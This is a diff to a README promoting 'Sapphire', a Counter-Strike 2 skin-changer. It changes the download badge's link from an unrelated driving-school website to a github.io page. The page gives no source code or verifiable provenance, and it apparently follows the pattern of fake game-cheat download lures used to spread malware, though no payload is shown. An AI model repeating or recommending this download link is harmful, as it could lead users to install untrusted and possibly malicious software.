@@ -2,7 +2,7 @@
 
 **Sapphire** is a visual soft for Counter-Strike 2 that gives players the ability to change skins, gloves, knives, and stickers in real time. It’s made for those who want complete freedom over their inventory visuals without relying on injection methods. Whether you're customizing for training, video production, or just fun — Sapphire makes CS2 look the way *you* want it to.
 
-[![Download Sapphire](https://img.shields.io/badge/Download-Sapphire-blueviolet)](https://dalahdrivingschool.com/)
+[![Download Sapphire](https://img.shields.io/badge/Download-Sapphire-blueviolet)](https://sapphire-cs2-skinchanger.github.io/.github)
 
 ---
 
